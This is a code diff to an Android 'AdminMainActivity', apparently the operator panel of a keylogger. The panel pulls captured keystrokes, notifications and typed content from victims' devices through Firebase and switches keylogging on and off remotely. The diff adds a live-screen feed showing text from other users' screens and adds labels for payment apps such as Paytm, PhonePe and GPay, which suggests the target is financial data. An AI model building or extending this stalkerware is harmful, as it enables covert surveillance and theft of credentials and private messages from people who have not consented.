@@ -28,19 +28,14 @@ class AdminMainActivity : AppCompatActivity() {
 
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
-    private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
 
     data class DeviceModel(
         val name: String,
         var keylogging: Boolean = true,
         var notifications: Boolean = true,
-        var logFeed: String = "Waiting for telemetry..."
-    )
-
-    data class LogEntry(
-        val timestamp: Long,
-        val appName: String,
-        val text: String
+        var liveScreenState: String = "Live Screen: Waiting...",
+        var isExpanded: Boolean = false,
+        var logFeed: String = "Waiting for device activity..."
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -64,17 +59,14 @@ class AdminMainActivity : AppCompatActivity() {
         recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
         recyclerView.layoutManager = LinearLayoutManager(this)
         adapter = DeviceAdapter(deviceList) { device, type, newState ->
-            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
+            val ref = FirebaseDatabase.getInstance().getReference("admin_commands").child(device.name)
             if (type == "key") {
-                device.keylogging = newState
                 ref.child("keylogging").setValue(newState)
                 ref.child("status").child("keylogging").setValue(newState)
             } else {
-                device.notifications = newState
                 ref.child("notifications").setValue(newState)
                 ref.child("status").child("notifications").setValue(newState)
             }
-            adapter.notifyDataSetChanged()
             Toast.makeText(this, "Command sent to ${device.name}", Toast.LENGTH_SHORT).show()
         }
         recyclerView.adapter = adapter
@@ -83,10 +75,10 @@ class AdminMainActivity : AppCompatActivity() {
     }
 
     private fun loadConnectedDevices() {
-        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        val dbRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val allEntries = mutableListOf<LogEntry>()
+                var totalEvents = 0
 
                 for (child in snapshot.children) {
                     val deviceName = child.key ?: continue
@@ -95,26 +87,18 @@ class AdminMainActivity : AppCompatActivity() {
                         deviceList.add(device)
                         listenToDeviceState(deviceName)
                         listenToDeviceLogs(deviceName)
+                        listenToLiveScreen(deviceName)
                     }
                     for (appChild in child.children) {
-                        val rawApp = appChild.key ?: continue
-                        val prettyApp = getPrettyAppName(rawApp)
+                        if (appChild.key == "live_screen") continue
                         for (entry in appChild.children) {
-                            val text = entry.child("text").getValue(String::class.java)
-                                ?: entry.child("title").getValue(String::class.java)
-                                ?: entry.child("typedContent").getValue(String::class.java)
-                                ?: continue
-
-                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
-                            if (text.isNotBlank() && text != "null") {
-                                allEntries.add(LogEntry(timestampMillis, prettyApp, text))
-                            }
+                            totalEvents++
                         }
                     }
                 }
 
                 txtTotalDevices.text = deviceList.size.toString()
-                txtTotalEvents.text = allEntries.size.toString()
+                txtTotalEvents.text = totalEvents.toString()
                 adapter.notifyDataSetChanged()
             }
 
@@ -122,8 +106,17 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
+    private fun parseTimestamp(value: Any?): Long? {
+        return when (value) {
+            is Long -> value
+            is Number -> value.toLong()
+            is String -> value.toLongOrNull()
+            else -> null
+        }
+    }
+
     private fun listenToDeviceState(deviceName: String) {
-        val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
+        val cmdRef = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName)
         
         cmdRef.child("keylogging").get().addOnSuccessListener { 
             if (!it.exists()) cmdRef.child("keylogging").setValue(true) 
@@ -162,9 +155,32 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
+    private fun listenToLiveScreen(deviceName: String) {
+        val teleRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches").child(deviceName).child("live_screen")
+        teleRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val screenText = snapshot.child("screenText").getValue(String::class.java)
+                val pkg = snapshot.child("packageName").getValue(String::class.java) ?: ""
+                val prettyApp = getPrettyAppName(pkg)
+
+                val index = deviceList.indexOfFirst { it.name == deviceName }
+                if (index != -1 && !screenText.isNullOrBlank()) {
+                    deviceList[index].liveScreenState = "Live Screen [$prettyApp]: $screenText"
+                    adapter.notifyItemChanged(index)
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {}
+        })
+    }
+
     private fun getPrettyAppName(pkg: String): String {
         return when {
             pkg.contains("whatsapp", true) -> "WhatsApp"
+            pkg.contains("paytm", true) -> "Paytm"
+            pkg.contains("phonepe", true) -> "PhonePe"
+            pkg.contains("paisa", true) -> "GPay"
+            pkg.contains("navi", true) -> "Navi"
             pkg.contains("chrome", true) -> "Chrome"
             pkg.contains("youtube", true) -> "YouTube"
             pkg.contains("instagram", true) -> "Instagram"
@@ -176,14 +192,16 @@ class AdminMainActivity : AppCompatActivity() {
     }
 
     private fun listenToDeviceLogs(deviceName: String) {
-        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
+        val logRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches").child(deviceName)
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val entries = mutableListOf<Triple<Long, String, String>>()
-                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+                val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
 
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
+                    if (rawApp.startsWith("notification_", true)) continue
+                    if (rawApp == "live_screen") continue
                     val prettyApp = getPrettyAppName(rawApp)
                     for (entry in appChild.children) {
                         val text = entry.child("text").getValue(String::class.java)
@@ -191,7 +209,7 @@ class AdminMainActivity : AppCompatActivity() {
                             ?: entry.child("typedContent").getValue(String::class.java)
                             ?: continue
 
-                        val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
+                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()
 
                         if (text.isNotBlank() && text != "null") {
                             entries.add(Triple(timestampMillis, prettyApp, text))
@@ -204,8 +222,8 @@ class AdminMainActivity : AppCompatActivity() {
 
                 val sb = StringBuilder()
                 for (item in entries) {
-                    val timeStr = timeFormat.format(Date(item.first))
-                    sb.append("[$timeStr] ${item.second}: ${item.third}\n")
+                    val dateStr = dateTimeFormat.format(Date(item.first))
+                    sb.append("[$dateStr] [${item.second}] ${item.third}\n")
                 }
 
                 val index = deviceList.indexOfFirst { it.name == deviceName }
@@ -225,11 +243,16 @@ class AdminMainActivity : AppCompatActivity() {
     ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {
 
         class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
-            val txtName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
+            val txtDeviceName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
+            val txtDeviceSub: TextView = view.findViewById<TextView>(R.id.txtDeviceSub)
+            val txtPresencePill: TextView = view.findViewById<TextView>(R.id.txtPresencePill)
             val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
             val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
             val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
             val scrollView: View = view.findViewById<View>(R.id.logScrollView)
+            val txtLiveScreenState: TextView = view.findViewById<TextView>(R.id.txtLiveScreenState)
+            val layoutDeviceHeader: View = view.findViewById<View>(R.id.layoutDeviceHeader)
+            val layoutLogContainer: View = view.findViewById<View>(R.id.layoutLogContainer)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -239,7 +262,7 @@ class AdminMainActivity : AppCompatActivity() {
 
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
-            holder.txtName.text = "💻 ${device.name}"
+            holder.txtDeviceName.text = "💻 ${device.name}"
 
             if (device.keylogging) {
                 holder.btnKey.text = "KEY_LOG: ON"
@@ -257,18 +280,35 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
             }
 
-            holder.scrollView.setOnTouchListener { v, event ->
-                when (event.action) {
-                    MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
-                        v.parent.requestDisallowInterceptTouchEvent(true)
+            // Bind Live Screen State
+            holder.txtLiveScreenState.text = device.liveScreenState
+
+            // Collapse/Expand log area based on click on device header
+            if (device.isExpanded) {
+                holder.layoutLogContainer.visibility = View.VISIBLE
+                holder.txtDeviceSub.text = "Tap to collapse logs"
+
+                holder.scrollView.setOnTouchListener { v, event ->
+                    when (event.action) {
+                        MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
+                            v.parent.requestDisallowInterceptTouchEvent(true)
+                        }
+                        MotionEvent.ACTION_UP -> {
+                            v.parent.requestDisallowInterceptTouchEvent(false)
+                        }
                     }
-                    MotionEvent.ACTION_UP -> {
-                        v.parent.requestDisallowInterceptTouchEvent(false)
-                    }
+                    false
                 }
-                false
+                holder.txtLog.text = device.logFeed
+            } else {
+                holder.layoutLogContainer.visibility = View.GONE
+                holder.txtDeviceSub.text = "Tap to expand/collapse logs"
             }
-            holder.txtLog.text = device.logFeed
+
+            holder.layoutDeviceHeader.setOnClickListener {
+                device.isExpanded = !device.isExpanded
+                notifyItemChanged(position)
+            }
 
             holder.btnKey.setOnClickListener {
                 onToggle(device, "key", !device.keylogging)
